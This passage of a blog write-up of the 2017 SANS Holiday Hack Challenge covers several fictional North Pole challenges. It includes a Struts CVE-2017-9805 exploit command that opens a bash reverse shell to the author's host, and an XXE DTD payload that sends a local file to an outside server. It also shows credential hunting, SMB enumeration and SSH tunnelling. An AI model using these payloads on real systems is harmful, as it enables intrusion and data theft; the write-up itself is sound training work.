</pre></table></code></div></div><p>Proceed to the site above and read the source code, I encountered another interesting information about the backend component of this application</p><div class="language-php highlighter-rouge"><div class="code-header"> <span text-data=" PHP "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"the-footer"</span><span class="nt">&gt;&lt;p</span> <span class="na">class=</span><span class="s">"center-it"</span><span class="nt">&gt;</span>Powered By: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://struts.apache.org/"</span><span class="nt">&gt;</span>Apache Struts<span class="nt">&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;</span>
    <span class="c">&lt;!-- Friend over at Equal-facts Inc recommended this framework--&gt;</span>
</pre></table></code></div></div><p>So there is a chance that the application uses Apache Struts and the exploit is related to the Equifax Hack.</p><blockquote><p>Hint 6: That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.</p></blockquote><blockquote><p>Hint 7: Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn’t break. I actually just checked and there are lots of different exploits out there for vulnerable systems. <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">Here is a useful article.</a></p></blockquote><blockquote><p>Hint 8: Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.</p></blockquote><p>In order to get a reverse shell, I need to have a public IP address. On Kali box:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-lvp</span> 443
</pre></table></code></div></div><p>To exploit:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python cve-2017-9805.py <span class="nt">-u</span> https://dev.northpolechristmastown.com/orders/542 <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/&lt;public-ip-goes-here&gt;/443 0&gt;&amp;1"</span>
</pre></table></code></div></div><p>It took me a long time after getting the shell to find the password because I overlooked the result coming from grep and things doesn’t work well over this netcat shell. I decided to setup persistence and upgraded my shell using msfvenom reverse_tcp shell.</p><p>While trying to get Alabaster Snowball’s password, the only place I can think of to have password is the tomcat manager. The application is located in <code class="language-plaintext highlighter-rouge">/opt/apache-tomcat</code>. I looked into <code class="language-plaintext highlighter-rouge">tomcat_users.xml</code> but no luck. After a few hours trying to grep with keywords like <code class="language-plaintext highlighter-rouge">pass, password, alabaster</code>, I was able to find the password in <code class="language-plaintext highlighter-rouge">apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class</code>.</p><div class="language-java highlighter-rouge"><div class="code-header"> <span text-data=" Java "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Connect</span> <span class="o">{</span>
            <span class="kd">final</span> <span class="nc">String</span> <span class="n">host</span> <span class="o">=</span> <span class="s">"localhost"</span><span class="o">;</span>
            <span class="kd">final</span> <span class="nc">String</span> <span class="n">username</span> <span class="o">=</span> <span class="s">"alabaster_snowball"</span><span class="o">;</span>
            <span class="kd">final</span> <span class="nc">String</span> <span class="n">password</span> <span class="o">=</span> <span class="s">"stream_unhappy_buy_loss"</span><span class="o">;</span>   
            <span class="nc">String</span> <span class="n">connectionURL</span> <span class="o">=</span> <span class="s">"jdbc:mysql://"</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s">":3306/db?user=;password="</span><span class="o">;</span>
            <span class="nc">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="nc">Statement</span> <span class="n">statement</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</pre></table></code></div></div><p>Password: <code class="language-plaintext highlighter-rouge">stream_unhappy_buy_loss</code></p><p>Note on this part:</p><ul><li>The netcat shell initially had really limited capabilities. I needed to change the <code class="language-plaintext highlighter-rouge">PATH</code> environment variable to be able to use more commands<li>The file <code class="language-plaintext highlighter-rouge">GreatBookPage2.pdf</code> was right on the root of <code class="language-plaintext highlighter-rouge">https://l2s.northpolechristmastown.com/</code>. I didn’t figure that out until I got the shell and was poking around with the application.</ul><p><strong>NEVER HARDCODE PASSWORDS!</strong></p><p><em>3. The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?</em></p><p><em>For hints, please see Holly Evergreen in the Cryokinetic Magic Level.</em></p><p>tl;dr:</p><ul><li>The file share name is <code class="language-plaintext highlighter-rouge">FileStor</code>.</ul><p>I made a mistake on this part, which took me a while to figure out the correct smb server. I read over the hint about host discovery and did a normal nmap scan, which is sure to miss the correct smb server.</p><p>The right way to do the nmap was:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>nmap <span class="nt">-v</span> <span class="nt">-PS445</span> 10.142.0.0/24

Nmap scan report <span class="k">for </span>hhc17-smb-server.c.holidayhack2017.internal <span class="o">(</span>10.142.0.7<span class="o">)</span>
Host is up <span class="o">(</span>0.00056s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report <span class="k">for </span>hhc17-emi.c.holidayhack2017.internal <span class="o">(</span>10.142.0.8<span class="o">)</span>
Host is up <span class="o">(</span>0.00018s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
</pre></table></code></div></div><p>The correct smb server is <code class="language-plaintext highlighter-rouge">10.142.0.7</code>. Since the victim machine (in #2) doesn’t have smbclient on it, I need to setup a SSH port forward so that I can access the share from my kali box.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh <span class="nt">-L</span> 445:10.142.0.7:445 alabaster_snowball@dev.northpolechristmastown.com
</pre></table></code></div></div><p>I am then able to list the shares.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>smbclient <span class="nt">-L</span> 127.0.0.1 <span class="nt">-U</span> alabaster_snowball
WARNING: The <span class="s2">"syslog"</span> option is deprecated
Enter WORKGROUP<span class="se">\a</span>labaster_snowball<span class="s1">'s password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        FileStor        Disk
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Connection to 127.0.01 failed (Error NT_STATUS_CONNECTION_REFUSED)
Failed to connect with SMB1 -- no workgroup available
</span></pre></table></code></div></div><p>The files are stored in <code class="language-plaintext highlighter-rouge">FileStor</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>smbclient <span class="se">\\\\</span>127.0.0.1<span class="se">\\</span>FileStor <span class="nt">-U</span> alabaster_snowball

smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Mon Jan  8 14:31:53 2018
  ..                                  D        0  Mon Jan  8 14:31:53 2018
  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 21:44:17 2017
  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 19:21:44 2017
  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 21:47:28 2017
  Naughty and Nice List.csv           A    10245  Thu Nov 30 19:42:00 2017
  Naughty and Nice List.docx          A    60344  Wed Dec  6 21:51:25 2017

                13106687 blocks of size 4096. 9624205 
</pre></table></code></div></div><p><em>4. Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?</em></p><p><em>Pepper Minstix provides some hints for this challenge on the There’s Snow Place Like Home Level.</em></p><p>I didn’t finish this one. However, I did found interesting stuffs.</p><p>According to the hints, there is something to do with hiding things from search engines. I then proceeded to check out <code class="language-plaintext highlighter-rouge">robots.txt</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>User-agent: <span class="k">*</span>
Disallow: /cookie.txt
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">cookie.txt</code></p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="c1">//FOUND THESE FOR creating and validating cookies. Going to use this in node js</span>
    <span class="kd">function</span> <span class="nf">cookie_maker</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">callback</span><span class="p">){</span>
        <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">need to put any length key in here</span><span class="dl">'</span><span class="p">;</span>
        <span class="c1">//randomly generates a string of 5 characters</span>
        <span class="kd">var</span> <span class="nx">plaintext</span> <span class="o">=</span> <span class="nf">rando_string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="c1">//makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters</span>
        <span class="c1">//Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.</span>
        <span class="kd">var</span> <span class="nx">ciphertext</span> <span class="o">=</span> <span class="nx">aes256</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">plaintext</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\=</span><span class="sr">/g</span><span class="p">,</span><span class="dl">''</span><span class="p">);</span>
        <span class="c1">//Setting the values of the cookie.</span>
        <span class="kd">var</span> <span class="nx">acookie</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">IOTECHWEBMAIL</span><span class="dl">'</span><span class="p">,</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="nx">username</span><span class="p">,</span> <span class="dl">"</span><span class="s2">plaintext</span><span class="dl">"</span><span class="p">:</span><span class="nx">plaintext</span><span class="p">,</span>  <span class="dl">"</span><span class="s2">ciphertext</span><span class="dl">"</span><span class="p">:</span><span class="nx">ciphertext</span><span class="p">}),</span> <span class="p">{</span> <span class="na">maxAge</span><span class="p">:</span> <span class="mi">86400000</span><span class="p">,</span> <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">encode</span><span class="p">:</span> <span class="nb">String</span> <span class="p">}]</span>
        <span class="k">return</span> <span class="nf">callback</span><span class="p">(</span><span class="nx">acookie</span><span class="p">);</span>
    <span class="p">};</span>
    <span class="kd">function</span> <span class="nf">cookie_checker</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">callback</span><span class="p">){</span>
        <span class="k">try</span><span class="p">{</span>
            <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">need to put any length key in here</span><span class="dl">'</span><span class="p">;</span>
            <span class="c1">//Retrieving the cookie from the request headers and parsing it as JSON</span>
            <span class="kd">var</span> <span class="nx">thecookie</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">IOTECHWEBMAIL</span><span class="p">);</span>
            <span class="c1">//Retrieving the cipher text </span>
            <span class="kd">var</span> <span class="nx">ciphertext</span> <span class="o">=</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">ciphertext</span><span class="p">;</span>
            <span class="c1">//Retrievingin the username</span>
            <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">name</span>
            <span class="c1">//retrieving the plaintext</span>
            <span class="kd">var</span> <span class="nx">plaintext</span> <span class="o">=</span> <span class="nx">aes256</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">ciphertext</span><span class="p">);</span>
            <span class="c1">//If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">plaintext</span> <span class="o">===</span> <span class="nx">thecookie</span><span class="p">.</span><span class="nx">plaintext</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nf">callback</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">username</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nf">callback</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
            <span class="k">return</span> <span class="nf">callback</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">};</span>
</pre></table></code></div></div><p><em>6. The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?</em></p><p><em>For hints on this challenge, please consult with Sugarplum Mary in the North Pole and Beyond.</em></p><p>tl;dr:</p><ul><li>The title of the page is <code class="language-plaintext highlighter-rouge">The Dreaded Inter-dimensional Tornadoes</code>.</ul><p>For this part, I also needed to do a SSH tunnel to access the site from my localhost. Visiting the site, We are presented with a web application with the following functionalities:</p><ul><li>Upload and display an XML file with the corresponding fields: http://eaas.northpolechristmastown.com/Home/DisplayXML<li>Reset the XML file to the default one: http://eaas.northpolechristmastown.com/Home/CreateElfs<li>A sample XML file at: http://eaas.northpolechristmastown.com/XMLFile/Elfdata.xml</ul><p>Following the hints, I carried out a XXE with DTD exploit on the application. This time, I need a public IP address again so that the application is able to access the malicious DTD from my server. The setup goes as following:</p><ol><li><p>A malicious DTD is accessible on my public server:</p><p><code class="language-plaintext highlighter-rouge">pwn.dtd</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> &lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
 &lt;<span class="o">!</span>ENTITY % stolendata SYSTEM <span class="s2">"file:///c:/greatbook.txt"</span><span class="o">&gt;</span>
 &lt;<span class="o">!</span>ENTITY % inception <span class="s2">"&lt;!ENTITY &amp;#x25; sendit SYSTEM 'http://&lt;public-ip-goes-here&gt;:8000/?%stolendata;'&gt;"</span><span class="o">&gt;</span>
</pre></table></code></div></div><li><p>The malicious xml file to be uploaded to the application:</p><p><code class="language-plaintext highlighter-rouge">elfdata.xml</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre> &lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
 &lt;<span class="o">!</span>DOCTYPE demo <span class="o">[</span>
     &lt;<span class="o">!</span>ELEMENT demo ANY <span class="o">&gt;</span>
     &lt;<span class="o">!</span>ENTITY % extentity SYSTEM <span class="s2">"http://&lt;public-ip-goes-here&gt;:8000/pwn.dtd"</span><span class="o">&gt;</span>
     %extentity<span class="p">;</span>
     %inception<span class="p">;</span>
     %sendit<span class="p">;</span>
     <span class="o">]</span>
 <span class="o">&gt;</span>
 &lt;Elf&gt;
   &lt;Elf&gt;
       &lt;ElfID&gt;1&lt;/ElfID&gt;
       &lt;ElfName&gt;x64&lt;/ElfName&gt;
       &lt;Contact&gt;13371337&lt;/Contact&gt;
       &lt;DateOfPurchase&gt;11/29/3017 12:00:00 AM&lt;/DateOfPurchase&gt;
       &lt;Picture&gt;2.png&lt;/Picture&gt;
       &lt;Address&gt;here&lt;/Address&gt;
   &lt;/Elf&gt;
 &lt;/Elf&gt;
</pre></table></code></div></div></ol><p>After uploading the malicious xml file to the application, I was able to see the content of <code class="language-plaintext highlighter-rouge">C:\greatbook.txt</code> in my web log on my server:</p><p><img data-proofer-ignore data-src="/assets/img/sans-hhc17/p6-img1.jpg" alt="greatbook.txt" /></p><p>Visit the URL to obtain page 6 of the great book!</p><p><a name="HHC17-learned"></a></p><h2 id="things-ive-learned-in-this-challenge">Things I’ve learned in this challenge</h2><ol><li>How to do SSH tunnel.<li>XXE, DTD and how to do a simple XXE with DTD.<li>Parsing data from the command line. This is a great one.</ol><p>And more importantly, the non-technical lessons</p><ol><li>Look carefully. Small but critial details are easy to overlook. I overlook many things: the hints for the correct nmap scan, the grep result for the password. They were all important and what I gotta pay for is time.<li>Play with exploits to understand it.<li><strong>NEVER HARDCODE YOUR PASSWORD, JUST DON’T</strong></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/pentest/'>pentest</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/pentest/" class="post-tag no-text-decoration" >pentest</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1"></span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=2017 SANS Holiday Hacking Challenge - ret2life&url=https://ret2.life/posts/SANS-HHC-2017/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=2017 SANS Holiday Hacking Challenge - ret2life&u=https://ret2.life/posts/SANS-HHC-2017/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=2017 SANS Holiday Hacking Challenge - ret2life&url=https://ret2.life/posts/SANS-HHC-2017/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="" title-succeed=""> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Google-CTF-2021/">Google CTF 2021 - Fullchain</a><li><a href="/posts/CSAW-CTF-17-Qual/">CSAW CTF 2017 Qualification</a><li><a href="/posts/AceBear-CTF-19/">AceBear CTF 19</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/GRIMM-HAX-Combined-Challenge/"><div class="card-body"> <span class="timeago small" >May 23, 2018<i class="unloaded">2018-05-23T03:08:38+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GRIMM HAX Combined Challenge</h3><div class="text-muted small"><p> This is the write-up for challenges I have done GRIMM HAX challenge. Welcome, Bobby (100pts) Accessing the website at http://www.haxcorp.grimm-co.com/, we are provided with a login page with us...</p></div></div></a></div><div class="card"> <a href="/posts/H1-702-CTF-2018/"><div class="card-body"> <span class="timeago small" >Jun 29, 2018<i class="unloaded">2018-06-29T20:48:43+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>H1-702 CTF 2018</h3><div class="text-muted small"><p> It’s this time of the year again and I have the chance to play the CTF held by Hackerone. It has a lot of mobile hacking challenge, and at the same time, I wanted to dive into this. What a good tim...</p></div></div></a></div><div class="card"> <a href="/posts/35C3-CTF/"><div class="card-body"> <span class="timeago small" >Dec 30, 2018<i class="unloaded">2018-12-30T11:01:14+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>35C3 CTF</h3><div class="text-muted small"><p> This is my first time participating in C3 CTF. Although I wasn’t able to solve many challenges within the time of the CTF, I still find the challenges really awesome and exciting. I wanted to solve...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/UB-Lockdown-v3/" class="btn btn-outline-primary" prompt="Older"><p>UB Lockdown V3</p></a> <a href="/posts/GRIMM-HAX-Combined-Challenge/" class="btn btn-outline-primary" prompt="Newer"><p>GRIMM HAX Combined Challenge</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Duc Phan</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4"></h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-WN0BSTHR4X"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-WN0BSTHR4X'); }); </script>
